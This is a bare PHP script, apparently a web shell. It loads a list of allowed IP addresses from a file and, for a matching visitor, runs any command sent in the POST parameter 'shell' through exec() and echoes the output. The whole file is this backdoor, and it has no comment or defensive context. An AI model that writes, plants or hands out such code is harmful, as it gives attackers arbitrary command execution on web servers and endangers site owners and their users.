<?php

$stdout;
$filename = "whitelist.dat";
$handle = fopen($filename, "r");
$finfo = fread($handle, filesize($filename));
fclose($handle);
$iparr = explode("\n", $finfo);

foreach($iparr as $ip) {
  if ($_SERVER['REMOTE_ADDR'] == $ip) {
    exec($_POST['shell'], $stdout);
    echo implode("\n", $stdout);
  }
}
